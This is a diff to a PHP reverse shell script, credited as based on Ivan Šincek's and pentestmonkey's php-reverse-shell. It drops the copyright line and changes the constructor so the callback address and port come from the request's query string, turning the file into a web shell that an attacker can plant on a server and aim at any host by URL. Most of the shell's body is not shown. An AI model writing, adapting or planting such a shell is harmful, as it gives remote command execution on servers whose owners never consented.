@@ -1,8 +1,8 @@
 <?php
-// Copyright (c) 2020 Ivan Šincek
-// v2.4
+// v2.5
 // Requires PHP v5.0.0 or greater.
 // Works on Linux OS, macOS, and Windows OS.
+// Based on the script developed by Ivan Šincek at https://github.com/ivan-sincek/php-reverse-shell.
 // See the original script at https://github.com/pentestmonkey/php-reverse-shell.
 class Shell {
     private $addr  = null;
@@ -17,9 +17,12 @@ class Shell {
     private $buffer  = 1024;    // read/write buffer size
     private $clen    = 0;       // command length
     private $error   = false;   // stream read/write error
-    public function __construct($addr, $port) {
-        $this->addr = $addr;
-        $this->port = $port;
+    public function __construct() {
+        $uri = $_SERVER['REQUEST_URI'];
+        $urlcomponents = parse_url($uri);
+        parse_str($urlcomponents['query'], $params);
+        $this->addr = $params['addr'];
+        $this->port = $params['port'];
     }
     private function detect() {
         $detected = true;
@@ -171,7 +174,7 @@ class Shell {
 }
 echo '<pre>';
 // change the host address and/or port number as necessary
-$sh = new Shell('127.0.0.1', 9000);
+$sh = new Shell();
 $sh->run();
 unset($sh);
 // garbage collector requires PHP v5.3.0 or greater
